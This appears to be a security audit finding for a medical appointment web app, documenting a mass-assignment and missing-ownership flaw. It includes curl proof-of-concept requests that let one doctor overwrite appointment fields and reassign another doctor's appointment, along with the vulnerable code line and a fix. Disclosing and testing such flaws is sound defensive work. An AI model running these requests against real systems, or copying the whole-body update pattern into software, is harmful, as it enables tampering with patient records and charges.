# V-14 — Any doctor can rewrite any field of any appointment ⭐

**Finding:** `updateAppointmentStatus` passes the **whole request body** to
`findByIdAndUpdate`. Nothing limits it to the `status` field, and nothing checks
that the appointment belongs to the doctor making the request — so a doctor can
overwrite unrelated fields and even reassign the appointment to themselves.
OWASP A01:2025 (Broken Access Control) / A08:2025, CWE-915 (mass assignment).
📍 [appointment.controller.js](../../backend/src/controllers/appointment.controller.js)

```js
appointment = await Appointment.findByIdAndUpdate(id, req.body, { ... }); // whole body
```

## Setup

```bash
# Terminal 1
cd backend && npm run dev:test

# Terminal 2 — from the repo root
tok() { node -p "const t=require('./security-tests/.tokens.json'); $1"; }
BASE=$(tok "t.baseUrl")
ALPHA=$(tok "t.accounts.alpha.cookie"); ALPHA_ID=$(tok "t.accounts.alpha.id")   # attacker (Dr Alpha)
BETA_ID=$(tok "t.accounts.beta.id")                                             # the real owner (Dr Beta)
DANA=$(tok "t.accounts.dana.cookie")                                            # a patient, for the control
APPT_ID=$(tok "t.ids.appointmentId")                                            # Alice's appointment with Dr Beta
```

Seeded values: `patientFirstName "Alice"`, `appointmentCharges "3000"`,
`city "Kandy"`, `department "Oncology"`, `status "Pending"`, `doctor = Dr Beta`.

> Run this **after** the V-15 step — V-15 reads the appointment before these
> writes overwrite it.

## Attacks

### Attack 1 — send fields other than status (mass assignment)
```bash
curl -s -i -X PUT "$BASE/api/v1/appointment/update/$APPT_ID" \
  -H "Cookie: $ALPHA" -H "Content-Type: application/json" \
  -d "{\"status\":\"Accepted\",\"appointmentCharges\":\"1\",\"city\":\"HACKED\",\"department\":\"HACKED-DEPT\",\"patientFirstName\":\"Overwritten\"}"
```

### Attack 2 — reassign the owner: steal the appointment for Dr Alpha
```bash
curl -s -i -X PUT "$BASE/api/v1/appointment/update/$APPT_ID" \
  -H "Cookie: $ALPHA" -H "Content-Type: application/json" \
  -d "{\"doctor\":\"$ALPHA_ID\"}"
```

### Control — a patient (Dana) tries to update it (the role guard that DOES exist)
```bash
curl -s -i -X PUT "$BASE/api/v1/appointment/update/$APPT_ID" \
  -H "Cookie: $DANA" -H "Content-Type: application/json" \
  -d "{\"status\":\"Rejected\"}"
```

## Expected result

| | Before the fix | After the fix |
|---|---|---|
| Attack 1 | `HTTP 200`; `patientFirstName`, `appointmentCharges`, `city`, `department` all overwritten | only `status` may change, and only for the doctor's own appointment |
| Attack 2 | `HTTP 200`; stored `doctor` becomes Dr Alpha's id | `doctor` cannot be reassigned; a foreign doctor gets `403`/`404` |
| Control | `HTTP 401` (patient blocked) | `HTTP 401` (unchanged) |

The control confirms the role guard works — the **missing** checks are
field-scoping and per-doctor ownership, not the role.

## How to fix

Allow only `status` through, validated against the enum
`["Pending","Accepted","Rejected"]`. Add `doctor: req.doctor._id` to the query so
a doctor can only touch their own appointments (or `404` otherwise).

## Re-run for "after" evidence

```bash
# restart the dev server first (these writes change the seed)
node security-tests/capture-v11-v15.mjs --after
bash security-tests/curl-v11-v15.sh --after
```
